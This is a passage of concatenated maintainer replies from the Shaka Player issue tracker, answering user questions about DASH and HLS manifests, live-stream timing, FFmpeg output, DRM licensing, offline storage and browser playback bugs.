it.\nAlso note that your timeShiftBufferDepth is 16 seconds.  That is extremely small and makes the seek window hard to stay in.  If it takes a bit to download the next segment, we will fall outside that window and need to seek to get back in the window.  That is probably why you are seeing the hick-ups; setting a larger time-shift window would give us more room to play in and avoid seeking to stay in the window.. It is highly recommended to include a UTCTiming element.  It is not strictly required, but not including it can cause clock-sync issues which can make us unable to find the segment.  If the server and client clocks are different by a large amount, we will calculate the incorrect \"current time\" and we may try to play segments that no longer exist (or don't exist yet).. Thinking about this more, 16 seconds is probably fine.  We use 3 seconds for the non-seekable HLS streams.\nBut note that your manifest doesn't have a suggestedPresentationDelay attribute, so we will assign a default value of 10 seconds.  This means that we will play 10 seconds from the live edge since the segments at the live edge don't exist yet.  If we play too close to the live edge, we might not be able to fetch segments, so we will stall and fall backwards.  So we play a bit behind it so the segments are available.  Since you have a 16 second window, that means that the seek window will only be 6 seconds long.. To properly test this, I would need access to the media segments too, not just the manifest.  But could you try playing the generated media files?  You could do something like:\nsh\ncat tea_pot_360.hdr tea_pot_360_1234.chk > my_video.webm\nThen try playing the WebM file in any video player like VLC or just open in Chrome.  I suspect that file will be a still image.\nWhat I think is happening is FFmpeg is taking the source image and converting it to a video of that one image.  FFmpeg first reads the input file of /home/user/raw_render/src/image_out, which I suspect is a still image.  Then FFmpeg converts that to a video by playing that image for the duration of the video.. This looks like a problem with your FFmpeg command.  I am not that familiar with the FFmpeg command line, so I can't really help.  I would suggest asking this on the FFmpeg mailing lists (ffmpeg-user@ffmpeg.org); you can read more about them on their website.  From our perspective, we are doing the right thing.  The manifest you gave us contains video segments that show a still video, so that is what we play.\nMy guess would be that FFmpeg is not re-opening the image_out file as it streams.  So it opens it at the beginning and streams until it reaches the end of the file, but it won't see any updates your renderer makes after it starts because it won't re-open the file.  But again, I am not that familiar with the FFmpeg command-line.. Without a playable manifest to test with, we can't reproduce the problem.  Could you setup a live stream that we can access that reproduces your problem?  Or if you could produce a VOD manifest that causes a similar problem, we could help with that.\nCould you also explain exactly what you are seeing in the browser?  You said but only the image is seen in the original post, but could you elaborate?  Is the video playing or paused?  If you open up the JavaScript console, do you see any logs (you'll need to use the debug version of the library)?  What is the value of video.currentTime, and is it changing?  What about video.paused and video.playbackRate?  Can you seek in the video?  If you use the demo page, while playing, what does the seek bar and playhead do?. I'm not sure what you mean by \"chunks\", but you are definitely not creating 30 segments (i.e. files) per seconds, because I doubt we could download and play segments that fast.  I think the segment duration is defined by the -chunk_duration_ms flag, which is 10 seconds in your above example.  Setting this too small requires us to download a lot of segments which can cause slowdowns.\nAs for low-latency options, anything you change can cause buffering problems.  We use conservative defaults for settings to ensure that we avoid buffering (stopping because we don't have enough downloaded).  If you try to play too close to the live edge, we can start buffering and fall behind if we don't get a segment in time.  But if you are fine with that, there are a few options to try:\n\nReduce  rebufferingGoal, this makes us need less content to continue playing.\nplayer.configure({rebufferingGoal: 1});\n\n\nAdd a suggestedPresentationDelay attribute to the manifest.\nUse a segment size of 1 second; less and we have trouble downloading all the segments, more increases the delay.\n\nYou may also want to increase the minimumUpdatePeriod.  This may seem weird, but your manifest uses SegmentTemplate with duration, meaning we don't actually need manifest updates unless you add new Periods.  So a larger update period means we are downloading less so the network can download segments faster.\nAlso setting an extremely small GOP interval will make your files much larger since you basically won't be compressing anything.  A GOP size of 1 second is the usual value.. It is common for live streams to suffer from drift when the encoder and the clients become different over time.  But it is usually the other direction; the encoder is encoding at 0.99x realtime, so the encoder falls behind over time and can't generate fast enough.  In your case, I think FFmpeg is encoding content faster than realtime, so it generates more content than the player is playing.\nYou could try passing the -re input option.  Since you are reading from a file, this option causes FFmpeg to wait before producing the next input data so it can simulate a live stream.  I think it would cause it to only generate segments at realtime.. You need to include the mux.js in the HTML before loading the Player.  This can be easily done using a <script> tag to load it.  Simply including it in a package manager doesn't work, you need to load the library on the browser.  For example, look at the demo sources.\nCould you provide a URL to your application?  Or a zip of the sources?  You can send it privately to shaka-player-issues@google.com if you prefer.  What errors are you seeing?  How are you loading mux.js?  Does the manifest play on the hosted demo page?. Does this answer all your questions?  Is there anything else we can help with?. License requests contain timestamps in them to prevent this kind of usage.  If a license request takes more than a certain amount of time (e.g. a few minutes), the response won't be accepted.  If you want to play protected content offline, I would suggest using our offline API.  It will handle storing the license offline so you can play it.  You can also configure it with usePersistentLicense of false and it won't store the offline license and instead make a license request when you play the content.\nIn general, you can't store a license request or license response for later use.  If you want an offline license, you need to use EME to request a special kind of license.  But we handle that for you in our offline API.. Correct.  The Player instance you pass to Storage should be configured with any license servers and filters needed to make the license request.  We will automatically get the license and store it correctly.\nWe detect protected content only using the manifest.  The manifest must contain a <cenc:pssh> element that contains the initialization data to generate the license request.  Normally, this element is optional and the browser will pull that info out of the media, but since we don't want to try and play the media, we require that initialization info be in the manifest.. Links to these issues appear in lib/media/drm_engine.js.. There is already a select box in the demo to select variants manually, just expand the Info section.  But there isn't a way to select a \"target bandwidth\".. This is a question best for the Widevine team: http://www.widevine.com/contact.html\nThe handling of licenses and persistent files is handled by the browser, so we don't do anything for it.  All we do is download the segments, save them, and fetch the license (which we just give it to the browser).\nWidevine is highly secure; from my understanding: the license is encrypted over the wire, so you can't read the keys from the Network tab.  The response is timestamped and has nonces, so you can't use the response in another computer, save it to use later, or give it to Chrome twice.  Also you can't get the keys from the license, so there is no way to distribute the decrypted content, only the encrypted files.  Only Chrome can use the keys and it will only allow playing the content, not just decrypting it.. Was this found with the same content as #1478?  If the Period start is changing, then the segment times probably aren't correct since they are Period-relative and so the old segments and new ones are using a different Period start time.  The segment merging should be done using the segment times, which are Period-relative presentation times.  So it should be accounting for presentationTimeOffset.\nWhen you say \"segments at time 0, 2, and 4\", are you referring to the S@t attribute value or the Period-relative timestamp?  Could you at least provide some XML that demonstrates what you mean?. But the Period start is changing, so the absolute presentation times of those segments probably aren't changing (from DASH's perspective).  So even though the first segment in the list starts at 0, you need to add the Period start to it before you can say whether the absolute presentation time changes.\nThe segment times in the SegmentIndex are Period-relative, so the new segments will show 0, 2, 4 because that are the times relative to the new Period start;  but the old segments have times of 0, 2, 4 relative to the old Period start.\nThis might be allowed by DASH and until v1.4.2 this was allowed by the IOP so long as the absolute presentation times of the segments don't change.  But with the latest IOP, this is disallowed since the Period start can't change.. We currently don't support changing Period start.  As of v4.1.2, this is actually forbidden according to the DASH IOP. See Dash-Industry-Forum/DASH-IF-IOP#160.  In v4.2 of the IOP, section 4.4.3.3 states:\n\nMPD@availabilityStartTime and Period@start shall not be changed over MPD updates.. This is caused by #1094.  Since you have DRM config, we try to initialize EME since we assume there will be encrypted content eventually.  Since Safari doesn't have any EME systems, we fail to initialize.  We should probably not fail if there aren't any key systems in this case.\n\nIt should be reproducible with this.  It is a DashIF clear live stream with a Widevine license server URL given to it.  It plays in Chrome (and probably Firefox) but not Safari.\nhttps://shaka-player-demo.appspot.com/demo/#asset=https://vm2.dashif.org/livesim/testpic_2s/Manifest.mpd;license=https://proxy.uat.widevine.com/proxy;lang=en-US;build=uncompiled. Chrome's buffer by PTS hasn't launched to stable yet.  It is still behind the feature flag.  The asset works fine when I run chrome with --enable-features=MseBufferByPts.  I don't have a timeline when it will not be behind a flag and the issue number tracking this launch is restricted.. The problem is the schemeIdUri attribute is incorrect.  You have it as 9a04f079-9840-4286-ab92-e65be0885f95 when the correct value is urn:uuid:9a04f079-9840-4286-ab92-e65be0885f95.  Similar for Widevine.. In this case, your timeline is changing.  Even though the SegmentTimeline element is the same, the segments appear at different presentation times.  In the live manifest, that first segment plays at a presentation time of 1532672679 seconds, whereas in the VOD manifest it has a presentation time of 0.043 seconds.  We can't easily support changing the timelines like this.. We can't really support that kind of content since the presentation time changes.  If you have any other questions, feel free to ask.  You can reopen this issue with a comment with @shaka-bot reopen.. The presentationTimeOffset adjusts the media time backward.  The calculation for presentation time is always (S@t - PTO) / timescale + Period@start, so:\n```js\n// Live Case:\n(73568288624767 - 0) / 48000 + 0 = 1532672679.6826\n// VOD Case:\n(73568288624767 - 73568288622720) / 48000 + 0 = 0.0426\n```\nI wrote a doc that may help explain how presentation times and segment times work:\nhttps://github.com/google/shaka-player/blob/master/docs/design/dash-manifests.md. You need to double escape it.  &amp;amp;  For example:\nhtml\n<Location>http://example.com/?q=foo&amp;amp;bar</Location>\nOnce we parse this, it will be sent to the server as http://example.com/?q=foo&amp;bar.. I don't really see a reason this shouldn't be supported.  It should be a simple fix.  I'll add it to our next release.. First, we now compile the wrapper template, so that text will no longer be used directly in the compiled bundle.  If I add export default to the current template, Closure will change it a bunch and I don't know if the results are any different than what we have now.\nBut if I manually change the compiled bundle to add that to the beginning, no browser can read it.  Even Chrome gives a syntax error when it tries to read that file; that would require using an ES6 module loader, you can't load that in a <script> tag.\nBut that wrapper is designed to support different module loaders, maybe we could support what you want to use too.  See the comments in the current wrapper.template.js file.  How are you loading Shaka Player that it needs this?  Does it work without it?. We could have a build-time flag to export as an ES6 module.  What we could to is have a second version of wrapper.template.js that would be used for ES6 mode.  I'll put this on the backlog, but we would be happy to review a PR for this too.\nI am curious though, if JSPM is loading using CommonJS, why doesn't it work?  We support loading as a CommonJS module (which doesn't use ES6).. Unfortunately there isn't anything we can do for this.  The browser doesn't support playing your content.  Since it plays fine in Chrome, you may want to file a bug with Opera (link).\nSome things to try:\n- Make sure Opera is up to date.\n- Make sure you've installed Windows updates.\n- Make sure your graphics drivers are up to date.\n- Try disabling hardware decode.\n- Try installing a third-party codec pack (Opera may be using the system decoders).. @sasank4git Did you try changing the audio frequency?  Did it work?  Did you file a bug on Opera and could you provide a link?  Do you have any other questions?. First, having a segment size of 1 hour probably won't be supported.  It would require us to download the whole segment which will take a while and the whole segment needs to be stored in memory when we give it to the browser.  We don't support downloading partial segments.\nNote that there is a difference between a segment and a file.  For live profile, the segments are stored in different files; but for on-demand profile, the segments are all stored in a single file.  So if you don't care about using a specific profile, you can just store the segments for the first Period in a single file and use either <SegmentBase> or <SegmentList> with byte ranges to specify a range within the file.  Note that (ignoring <SegmentBase>) we only use the info in the manifest to determine what to download; so we won't use any sub-segment information.\nAlso having 0.6 second segments means we are downloading a lot of segments while we play, which can cause slowdowns;  the common length to use is 2-6 seconds.\nBut to answer your question, there isn't any way to change that.  We are going to change how we determine the live edge in #999, which will stop using the wall-clock time at all.  That enhancement should allow your manifest to work.. A single segment for the whole Representation is common for text streams since they are so small.  But having a single segment for video would be much larger.  I think DASH has a way to signal sub-segment info, but we don't support it.  We only support playing whole segments.\nWe do handle sidx parsing, but only for <SegmentBase>.  In this case, the manifest only specifies a byte range of the sidx box and we parse it to determine where the segments are.  In the case of <SegmentList> and <SegmentTemplate> the manifest already specifies where the segments are so we don't need to download anything to construct the index.. We could add support for subsegments, but it might be difficult.  We currently think only about segments, so it may be difficult to change to think about subsegments.  Although, we might be able to just use the same type for subsegments.\nBut what you can do is use a <SegmentBase> element for the first Period.  That would have us use the sidx box for the index.  Then you could still use <SegmentTemplate> or <SegmentList> for the live portion.  The only problem is it is against the live profile so some clients may not support it, but we will.. Is the duration you set the duration of the content in the manifest or is it longer than the content available?  If we didn't do a manifest update, could we play to the duration or would it run out of available content?\nThe idea of IPR is that we know the duration ahead of time; if you are changing the duration, why not use a normal live stream?  Once the live stream ends you can convert it to VOD.\nWe set the duration at the beginning since not having a duration makes seeking not work well.  Even for live streams we set a huge duration so that we can seek while playing.  We could increase the duration while we play, but decreasing it would be difficult.\nIt looks like the DASH parser already updates the duration in the PresentationTimeline, it just doesn't get updated to the <video>.  We may be able to support changing the duration in the future, but I'll but this on the backlog for now.. Shaka Player only supports browser environments and environments where there is a JavaScript interpreter with the required types available (e.g. MSE).  This can include smart TVs like the Tizen TV.  We do not support native apps since they aren't written in JavaScript (some frameworks allow you to write JavaScript, but they don't have MSE or other browser types we need).. Sure, that sounds reasonable to me.  Note that I would also have that for the arrayBuffer() call to since that could fail.  It would also be much easier using async/await and a try/catch.  Do you want to send in a PR?. What you could do is have a separate method that is async and uses await; then in the main plugin call that method and use the returned Promise.  But that would be a larger refactor, so you don't have to.\n```js\nshaka.net.HttpFetchPlugin = function(uri, request, requestType) {\n  let controller = new shaka.net.HttpFetchController.AbortController_();\n  return new shaka.util.AbortableOperation(\n      shaka.net.HttpFetchPlugin.impl_(uri, request, requestType, controller),\n      () => { controller.abort(); return Promise.resolve(); });\n};\nshaka.net.HttpFetchPlugin.impl_ = async function(uri, request, requestType, controller) {\n  ...\n  try {\n    await fetch(...);\n  } catch (e) {\n    ...\n  }\n};\n``. Thekey was added` log is printed whenever any keys are added, so what is likely happening is we are getting the wrong keys from the license server.  You should check the key status changed event to see what keys were added vs what keys we need.  Also you should check the expiration of the sessions to see if the session is expiring before we can use it.\n@mjaddani I think that distinctive identifiers are only supported on Android which is why you are getting an error on desktop platforms.  I don't think there is a way to get unique IDs for desktop since the OS doesn't provide that info.  Unfortunately you'll need to use platform detection to determine if you are on Android and conditionally set that attribute.. Sorry not following-up sooner.  I believe this is a duplicate of #1554, which has been fixed by Widevine and will appear at least in Chrome 71, maybe sooner.  It was also fixed on the CDM side, so it should appear in Firefox too, although I don't know when.. We shouldn't have to do anything to support the new encryption.  There isn't anything we do special for encryption schemes, so it should already be supported.  The exception to that is in HLS we needed to add support for a new scheme in an HLS attribute, but that was added in #1515.. I don't believe we touch the PlayReady headers, so I think it would only depend on the platform.  I think this data is part of the init data in the segment, which we just pass directly to the platform.  So it should be supported.. This is a limitation of Shaka Player.  If you will have internet connection when you play later, I think you can store it with usePersistentLicense=false and we won't store the licences.  But it requires internet access to play the content:  storage.configure({usePersistentLicense: false})\nWhen we store content, we need to create an EME offline session so we can play the encrypted content later.  To create the session we need the init data, which is usually PSSH data.  If it is in the manifest, we can just pass it to EME to create the offline session.  But if we don't have it, we need to get it from the media.  In a streaming situation, we pass the media to the browser and it gives us an encrypted event with the PSSH data in it.  But when we are storing content, we can't give it to the browser since we don't want to create a <video> element and have to deal with MSE.\nWe could parse the segments while we store them and look for the PSSH data.  We don't do this since it would really complicate the storing logic and doesn't work for other container formats.  It might be easier for MP4 since we have an Mp4Parser type to make parsing easier, but trying to support WebM would be much harder since we don't have a simple parser for it.. ~~~The media segment is invalid.  The size of the mdat box is 265 bytes too large.  The mdat starts at offset 2517 and has a size of 0x00093aef, so it ends at 607428, which is 265 bytes larger than the file.  The 5 emsg boxes have a total size of 265, so it looks like your encoder is not accounting for that when it calculates the size of the mdat.~~~  (edit: see next comment)\nWe will definitely support the empty data field; but we have to consider if we want to support this kinds of bad content or not.. Actually I was incorrect, I didn't see the range requests.  Your sidx is incorrect.  @theodab  was correct and we aren't requesting the whole mdat.  The reason is because your sidx is slightly off, by 265 bytes.\nThe first entry in the sidx doesn't account for the 5 emsg boxes, so the referenced_size attribute is 265 bytes too small, so the first segment is too small.  This plays fine in a streaming situation since the browser will just append the segments one after another, but if you seek, you'll get a segment in the middle of where it should be.. The emsg box is defined by the DASH spec in ISO/IEC 23009-1; from the 2014 version, I only see version 0 specified.  Could you provide a spec for emsg version 1?  And yes, you can file another issue for that, we don't support it.. Fixed in 376c5001c32b80dd17aca4d3d83843981ea4c3fe.. We already had a patch to fix this internally.  This was fixed in 376c5001c32b80dd17aca4d3d83843981ea4c3fe.. What kinds of errors would exist for a single track?  If it is a 401/403 error, it would affect every URL at that domain; if it was a 404, that seems like either bad content or a transient error that might be fixed by waiting; 5XX errors are also likely to affect every stream.  Also, if there are 2 audio streams and 5 video streams, that means we will need to exhaust the retry parameters on 10 attempts before we fail to play, that is a lot of network requests to wait for a failure.\nFor your application, you could implement a custom AbrManager.  You could subclass our implementation and filter out any variants you don't want to play.. Yeah, that looks like a bug.  Since we are already full for the next two releases and this seems lower priority, I'll put this on the backlog.  But feel free to send a PR if you (or anyone) wants.. This is best asked on the Shaka Packager page as it more relates to them.  +@kqyang \nThe segment duration refers to the duration of full segments, which represents the portions of the stream that the player downloads at a time.  For example, for 10 second segments, the player will download 10 seconds at a time.  For certain profiles (e.g. Live) segments are stored in separate files, but for others, the segments are all stored in a single file and the player makes range requests to get the part of the file that represents that segment.\nChanging the segment duration affects how much the player will download at once.  Smaller segments can reduce latency by allowing the player to download faster and closer to the live edge; but small segments have some size overhead and can increase network usage.  Common settings are 10 seconds for VOD and 2 seconds for Live.\nI'm not sure about fragment duration and I think it may be a term used by the Shaka Packager specifically.  I believe it means creating sub-segments.  For example, in MP4, each segment will be composed of multiple moof boxes of the given length.  Smaller values might make seeking easier and some players support subsegment fetching; but I don't think changing the fragment duration will change Shaka Player that much.. We don't support using persistent licenses for that, we only support persistent licenses when storing content offline.  If you use shaka.offline.Storage to store content offline, we'll use persistent licences to allow playing the protected content offline; but we don't support using persistent licences to avoid licenses requests between playbacks.\nNote that persistentStateRequired is EME terminology that refers to what the CDM is allowed to do when we create it.  By stating that persistent state is required, the CDM can store information in files, but it doesn't actually refer to storing licenses offline; the licenses we request are still only streaming licenses.\nThis also may be a difficult feature to add since it is difficult to associate the new stream with the existing keys.  Even if the manifest is the same, the content may be different.  Also if the key IDs are the same, we still may not be allowed to use the same license due to policy requirements (the CDM may reject using the license with this content).  So it is usually best to always request a license for this content so we are sure that we get a license that works with this content.\n(also I don't know if Chrome 56 supports persistent licenses, I think it is a newer thing on desktop.  Persistent state can be supported but persistent licences may not be supported). Firefox and Chrome use the same Widevine CDM; so this may be a bug in the CDM or the adapter, which would make sense since those two browsers use them same versions.  Even if the bug is higher in the media stack, since they use the same CDM, they just may have made the same mistake.. @jpfranco I am unable to reproduce this issue with any of our content.  Can you post a public asset that we could use in a bug report?  Or would you be ok with us forwarding the page you sent us to the Chrome devs who work on this?. Ok.  I've filled https://crbug.com/883003 for this.. The issue has been reported as fixed in Chrome 71; I don't know if the fix will appear in Chrome 69 (current stable) or 70.. From the Chrome issue:\n\nWe missed the M71 branch cut to land the CDM with this change. This change will be in M72 Chrome.\n\nI don't have a specific CDM version where the fix appears.\n\nWould it also be necessary to open a ticket with Firefox about this, or do they pick up CDM updates regularly? Thanks\n\nI am not familiar with Firefox's CDM updates.  It was entirely a fix in the CDM, so Firefox only needs to update to get it.  But you should talk with them to determine when the fix will appear.. The Player constructor accepts an HTMLMediaElement, which is both a <video> and an <audio>.  I don't think there are any problems with using an <audio> element instead.  It should be handled exactly the same.. In most cases, the browser is in a sandboxed environment and can't access the local files on your computer.  So there is likely not a way to load the files from your local filesystem.  One way you could do this is to create a temporary web server to host the files locally and fetch the files from it (e.g. with Python).  Once you have a web server for the files, you can just load them like any normal manifest.  For example: player.load('http://localhost:8080/foo.mpd').\nIf you are using clear-key, you can give Shaka Player the keys and we will play it like normal.  But for a real key system like Widevine or PlayReady, you'll still need to make a real network request to get the license.  There isn't a way to store a license in a file and move it between computers.. > 1. Let's say, abrManager is downloading a segment at 8000kps, then suddenly client bandwidth drops to 1000 kbps. So, abrManager may abort the request and may request the lowest variant. Also, consider vice versa.\nHandled in #1051.\n\n\nUnless I am wrong, shaka retries requests as long as we configure the retry times. Let's say, first few requests have failed and I assume shaka would not retry different variant which has a different bitrate. So, what if abrManager detects this failed requests and lower the bitrate. This would be also valuable if the request timeout exceeds.\n\n\nIf there is a network error, the Player will retry the exact same request up to the retry limit.  If there are errors, AbrManager isn't involved and won't change the bitrate.  Although #1542 has requested we change that.\n\n\nSome devices might have performance issues. I specifically work on Samsung and LG TVs. Those platforms are definitely non-performant and the app can be stuck when the CPU reaches its capacity. So, what if we implement to find/estimate the CPU performance of the device and perform a better variant selection by abrManager.\n\n\nWe only use the network bandwidth to adjust the current stream.  But you should look at #907 and #745.\n\n\nAbrManager can send multiple segment requests by using web workers. Since other requests would be made on different thread, it would not make any performance issue on the main thread. So, abrManager can append available buffers by considering these different responses.\n\n\nNetwork requests are handled by the browser in background threads, so using a web worker would probably not change anything involving concurrent requests.  We do request different streams (e.g audio and video) concurrently.  But we shouldn't request too many at once since that will take up more bandwidth and slow the request time.. Looking at this again today, it works fine for me (https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=https://edge1.cablecolor.net//channels/hch-10/live/hch-10.mpd;lang=en-US;build=uncompiled).  Did you restart the stream again?  Could you provide another stream that has this issue?. The problem is the last segment in the manifest of the audio stream is much further in the past than the video streams.  When I fetched the manifest, all the video streams ended at 1720929840, or a presentation time of ~19121 seconds; the audio stream ends at 1710721200, or a presentation time of ~19008 seconds.  So the audio stream is 113 seconds in the past.\nNow that we ignore the availabilityStartTime attribute (so we are resilient against drift), we assume that the streams are aligned and being generated at the live edge.  Even if we used the availabilityStartTime, I think it would put us at the end of the video stream and we would still not be able to find the audio segments at the end.\nIt looks like the audio and video aren't aligned.. Yes this would be a packager issue.. Please fill out the form in the issue template.  Note that we don't provide support for Shaka Packager or JW Player, you should talk with them if you have a problem with them.  Please test with the our hosted demo or a custom app using Shaka Player that you can share.  Specifically, we'll need the manifest URL (not a copy of the manifest) so we can reproduce the error.\nFrom the Firefox error, it looks like a CORS error, you should check to see the host or CDN you are using is setting the correct CORS headders.\nSince it is encrypted content, you need to provide a license server URL, you can ignore the certificate URL.  Since you are using the widevine_test provider, you probably want https://proxy.uat.widevine.com/proxy.\nIf you still have a problem, please give us the following information:\n\nHave you read the FAQ and checked for duplicate open issues?:\nWhat version of Shaka Player are you using?:\nCan you reproduce the issue with our latest release version?:\nCan you reproduce the issue with the latest code from master?:\nAre you using the demo app or your own custom app?:\nIf custom app, can you reproduce the issue using our demo app?:\nWhat browser and OS are you using?:\nWhat are the manifest and license server URIs?:\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?. Chances are this is either a CORS error or a mixed-content error.  You entered the url using http, but the hosted demo is accessed using https, so the browser won't load the content.  You have two options: host the manifest and media on a server using https, or host your own demo site and access it using http.\nAs for CORS errors, you can read about it here: https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS.  Basically you need to set special headers if the site accessing the content is at a different URL than the content you are trying to access.  Since the hosted demo is on a different domain, you need to set CORS headers for the manifest and segments so the demo can access it.  How you set the headers depends on how you are hosting your content, so look at the documentation for your server host.. That is working as intended, DASH requires that all Periods have unique IDs.  If a manifest update has a Period with the same ID, it needs to represent the same content and have the same streams in it.  You can't reuse Period IDs for new Periods and can't change streams during playback.  New Periods need a new ID, but can have different streams than the previous; but an existing Period can't change streams.\nPeriod IDs are used to associate the previous manifest update with this one.  It allows us to determine which of the Periods from the previous manifest update correspond with the Period in this update.  So the same Period needs to have the same ID and new Periods need to use different IDs.\nNote that if a Period doesn't have an id attribute, we will generate an ID based on the start time of the Period.. Since the timeline is available using getManifest(), how about just making getLiveEdge public and exporting it?. First, for future reference, we need a playable URL, not the text of the manifests.  In general, we need to be able to put the URL in Shaka Player and see what it is trying to do.  But in this case, I can see what the problem is.  Second, we don't support substitutions, so the URLs won't be correct, see #1561 for more.\nLastly, the issue is your EXT-X-BYTERANGE tag is wrong.  It ends with a comma, which is against the spec.  The spec (in section 4.3.2.2) says that the format of the value is <n>[@<o>], so it can only be a number at the end.\nI also notice that most of your tags end in commas, which for attribute lists may be supported, but for interoperability should be removed.. What platform are you running on?  Did you try deleting everything and doing a clean git clone?  What is the output of ls -ld /home/cyberia/shaka-player/node_modules/wd/build?  What is the output of npm -v?\n\nI got something saying I should update something so I wouldn't be vulnerable to ReDoS, can anyone tell me what and how if needed?\n\nWe don't use the NPM modules for anything except testing, so the versions of the packages we use are probably out of date, and we know that some packages have some really outdated dependencies.  So I don't think there is anything you can do to fix that.. Maybe caused by https://github.com/admc/wd/issues/483?  Try npm install --unsafe-perm.. I am able to play that asset fine.  What Shaka Player version are you using (the version number is at the top of the page)?  Does it work if you clear your browser cache?\nhttps://shaka-player-demo.appspot.com/demo/#asset=https://b26807-p1-h97-afpq2p4v.1.cdnprepro.telefonica.com/_26807/Dash2Smooth/set064/MEZZ_THEHELP_30Mbps_1080i30.mpd;license=https://test.playready.microsoft.com/service/rightsmanager.asmx;lang=en;build=compiled;play. As described in the documentation for the error:\n\nNo Master Playlist has been provided. Master playlist provides vital information about the streams (like codecs) that is required for MediaSource. We don't support directly providing a Media Playlist.\n\nAfter #1431 we may be able to support playing media playlists, but for the moment we only support playing master playlists.. I'm not sure what you mean.  We don't support reading media playlists, so there is no way to change that.  If you really wanted to, you could write your own manifest parser to parse the HLS manifest; you can look at the tutorial for more info on that.  Otherwise, the only real configuration is done through Player.configure.. This looks like a Firefox bug.  https://bugzilla.mozilla.org/show_bug.cgi?id=1491045. This is sort of expected.  What is happening is we are using VTTRegion to set the portion of the window to draw the cue on.  Then the browser is styling the VTTRegion with the default styles, which includes a background color of black.  Normally, you should be able to add CSS to style them, like:\ncss\nvideo::cue-region {\n  background: transparent;\n}\nHowever, both Chrome (https://crbug.com/884232) and Firefox (https://bugzilla.mozilla.org/show_bug.cgi?id=1491365) have bugs where you can't use CSS to fix this.  Maybe we should just not use VTTRegion since it isn't even enabled in Chrome by default and Firefox has at least one bug with it.\nAlso note that your cues are supposed to have a transparent background, but we don't support many TTML styles, so we ignore it and just use the default black background.\nI've filed #1585 to handle the odd positioning.. I guess we can revert VTTRegion support until browsers fix their implementations.  It is currently only doing something on Firefox anyway.\nAlso note that even though #1585 is fixed, it won't fix your content.  You use a non-spec-compliant namespace URI in your TTML files; I suggest you talk to your encoder about using the correct namespace URIs.  That file uses http://www.w3.org/2006/10/ttaf1, but the correct namespace URI is http://www.w3.org/ns/ttml.  I can't find any spec (even old versions) that use that namespace URI.\nSee: https://www.w3.org/TR/ttml1/#vocabulary-namespaces. First, you didn't post a manifest URL, so it will be hard to reproduce.  If you go to the hosted demo and play a live stream it works fine with the demo assets.  Second, the version you posted isn't a Shaka Player version, it actually appears to be a Shaka Packager version.  Please post the Shaka Player version.  Lastly, the image you posted doesn't appear to be the demo app's UI.  Displaying the correct time is the job of the UI, which is currently the job of the app.  Our demo app has custom controls to handle this better, but your custom app will need to implement it.. LICENSE_RESPONSE_REJECTED means the browser rejected the response we got from the license server.  My guess would be the old version of Chromium you're using doesn't support a new protocol the license server is using.  You should upgrade your browser.. The one native track represents what is currently streaming from Shaka Player.  You can change what we stream using player.selectTextLanguage or player.selectTextTrack; you can query languages and tracks with player.getTextLanguages and player.getTextTracks respectively.  By default we play the latest added, but you can change this later.\nAlso note that if you are using native controls, you may need to set the streaming.alwaysStreamText configuration to ensure we play it.  We have no way of detecting when the text track is showing.  By default we only download text streams when they are visible.  So if you change the native track's visibility without using the player (player.setTextTrackVisbility), then we won't stream it.  You can set to always stream text with player.configure('streaming.alwaysStreamText', true).\nAs for why we only have one native track, it is because we want to stream only what is being displayed.  If we had multiple native tracks for different languages, we would have to download all of them since it would be hard (or impossible) to determine which is currently displayed and get events when it changes.  So we reuse the same native track and handle buffering and changing languages internally.. Thanks for finding this.  But I don't think this is the correct fix.  notifySegments_ uses a stored array of segments, which may not be edited by offsetting the segments (and if it is, we shouldn't assume it).  I think a better fix would be to add an offset method to PresentationTimeline to adjust the timeline like we adjust the segments.  Also please update the tests and ensure this is handled by a test (e.g. editing the sets maxFirstSegmentTime test from test/hls/hls_parser_unit.js).\nOr if you would prefer, I could implement this instead.. Thanks for finding this.  But I don't think this is the correct fix.  notifySegments_ uses a stored array of segments, which may not be edited by offsetting the segments (and if it is, we shouldn't assume it).  I think a better fix would be to add an offset method to PresentationTimeline to adjust the timeline like we adjust the segments.  Also please update the tests and ensure this is handled by a test (e.g. editing the sets maxFirstSegmentTime test from test/hls/hls_parser_unit.js).\nOr if you would prefer, I could implement this instead.. > Can you please elaborate a bit on \"some off-by-one logic we have to deal with manifest inaccuracies\" maybe that is why we see 2 video segments downloaded for each seek.\nWhen we seek, we always request the the segment before the seek time.  This ensures that if the segments in the manifest are different than the media, we get content at the seek time.  The media times in the manifest may not be exactly the same times as the times in the segments.  So if we seek to a time of 31 seconds and download the segment starting at 30 seconds, that segment may really start at 32 seconds, meaning we won't have any content at the current time of 31 seconds.\nUnfortunately there is no way to change this behavior.. > Can you please elaborate a bit on \"some off-by-one logic we have to deal with manifest inaccuracies\" maybe that is why we see 2 video segments downloaded for each seek.\nWhen we seek, we always request the the segment before the seek time.  This ensures that if the segments in the manifest are different than the media, we get content at the seek time.  The media times in the manifest may not be exactly the same times as the times in the segments.  So if we seek to a time of 31 seconds and download the segment starting at 30 seconds, that segment may really start at 32 seconds, meaning we won't have any content at the current time of 31 seconds.\nUnfortunately there is no way to change this behavior.. No, there isn't any way to change this behavior, the only way would be to edit the sources and create a custom build.. No, there isn't any way to change this behavior, the only way would be to edit the sources and create a custom build.. Closing due to inactivity. If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including @shaka-bot reopen in a comment.. Closing due to inactivity. If this is still an issue for you or if you have further questions, you can ask us to reopen or have the bot reopen it by including @shaka-bot reopen in a comment.. I've confirmed that this happens.  This is probably a browser bug; Microsoft has a new key system that is better spec-compliant that (hopefully) won't have these kinds of issues.  You can read more in #1495.\nUnfortunately we can't parse the PSSH data to dedup them like this.  This may work for PlayReady, but other key systems may require these duplicate entries.  For example, this won't work for Widevine which requires that multiple PSSH boxes be passed in as-is.  We could do this conditionally on PlayReady, but in light of #1495, I don't think we should add more workarounds when it does work as-is.\nA workaround you could do is to add the init data into the manifest.  If your manifests have a <cenc:pssh> element, we will use that instead of the data in the media.  This will allow you to avoid the extra license request and will also initialize the sessions earlier instead of waiting for the encrypted event.. If you're interested in a Chromecast API solution, you should look at their messaging protocol.  You can use that to send generic messages to the receiver app, and your custom receiver can handle it.  We use a specific channel to send messages related to playback, but you could use a different namespace and send messages for your app.. Noticed in #1602, fixed in bc7f31efbd6d57ef905c344338bba8fd8c0da5ab.  You can try the nightly to see it works: https://nightly-dot-shaka-player-demo.appspot.com. The second isn't playing because we can't parse the TS data.  We only support playing encrypted TS through Widevine, we don't support AES-128 (see #850).  